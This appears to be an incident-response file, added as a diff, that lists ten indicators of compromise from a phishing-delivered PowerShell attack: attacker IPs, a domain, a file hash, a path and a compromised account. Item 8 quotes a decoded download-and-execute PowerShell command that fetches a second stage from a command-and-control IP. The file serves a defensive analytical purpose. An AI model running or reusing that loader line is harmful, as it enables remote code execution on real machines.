@@ -1,0 +1,31 @@
+Verified IOCs from Incident INC-2026-0417:
+
+1. IP Address: 203.0.113.42 - External IP making SQL injection attempts, admin access, and bulk data export requests
+   - Source: app.log (lines 7, 21-22), web_access.log (multiple lines)
+
+2. IP Address: 192.168.1.100 - Command and control server IP address used in PowerShell payload
+   - Source: facture_2024-11.ps1.txt (line 22)
+
+3. IP Address: 192.168.1.101 - Command and control server IP address used in PowerShell payload
+   - Source: facture_2024-11.ps1.txt (lines 23-24)
+
+4. Domain: malicious-domain.ru - Malicious domain used for DNS query (NXDOMAIN result) and URL host for payloads
+   - Source: edr_events.jsonl (line 5, line 24), facture_2024-11.ps1.txt (line 24)
+
+5. SHA256 Hash: 064a9a9fe8a517182768cf13f407edc1bf6292ef0b9aa309d3db1cd753d66f40 - Hash of the malicious PowerShell script facture_2024-11.ps1
+   - Source: edr_events.jsonl (line 1)
+
+6. File Path: C:\Users\m.durand\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\X7K2P9QZ\facture_2024-11.ps1 - Full path of the malicious file delivered via phishing email attachment
+   - Source: edr_events.jsonl (lines 1-2)
+
+7. File Identifier: X7K2P9QZ - File identifier in the INetCache path for the delivered payload
+   - Source: edr_events.jsonl (lines 1-2)
+
+8. Encoded PowerShell Command: IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage.ps') - Base64-encoded PowerShell command decoded to IEX DownloadString instruction
+   - Source: facture_2024-11.ps1.txt (base64 encoded content)
+
+9. User Account: CORP\m.durand - Compromised user account that executed the malicious PowerShell script
+   - Source: edr_events.jsonl (multiple lines, lines 1-5)
+
+10. Domain (DNS): malicious-domain.ru - DNS query for malicious domain resulting in NXDOMAIN response
+    - Source: edr_events.jsonl (line 5)
